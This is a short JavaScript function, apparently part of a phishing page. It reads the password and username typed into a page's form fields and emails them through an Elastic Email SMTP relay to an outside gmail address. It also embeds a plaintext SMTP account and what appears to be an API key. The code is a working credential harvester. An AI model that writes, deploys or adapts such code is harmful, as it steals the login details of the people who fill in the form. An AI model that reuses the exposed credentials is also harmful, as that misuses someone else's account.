function sendEmail()
{
  Email.send({
    Host : "smtp.elasticemail.com",
    Username : "ussopvinsmoke333@gmail.com",
    Password : "ACEC066BDBCDCF4038DE794FDA32D509DEBE",
    To : 'senpairizz59@gmail.com',
    From : 'nishantkushwaha913@gmail.com',
    Subject : "This is the subject", 
    Body :document.getElementById("passsword").value +
    document .getElementById("Username").value 
}).then(
  message => alert("Message sent sucessfully")
);
}